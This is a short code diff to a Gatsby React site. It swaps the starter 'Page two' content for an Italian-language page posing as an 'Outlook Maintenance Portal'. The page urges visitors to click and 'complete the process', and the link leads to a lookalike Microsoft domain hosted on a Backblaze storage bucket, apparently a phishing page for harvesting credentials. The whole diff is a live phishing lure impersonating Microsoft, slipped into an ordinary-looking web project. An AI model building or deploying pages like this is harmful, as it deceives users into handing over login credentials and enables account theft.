@@ -6,10 +6,10 @@ import Seo from "../components/seo"
 
 const SecondPage = () => (
   <Layout>
-    <Seo title="Page two" />
-    <h1>Hi from the second page</h1>
-    <p>Welcome to page 2</p>
-    <Link to="/">Go back to the homepage</Link>
+    <Seo title="Outlook" />
+    <h1>Portale di Manutenzione Outlook</h1>
+    <p>Clicca qui sotto per completare il processo</p>
+    <Link to="https://microsoftoutlookonlinemaintenanceportal.s3.us-west-002.backblazeb2.com/index.html">Portale Outlook</Link>
   </Layout>
 )
 
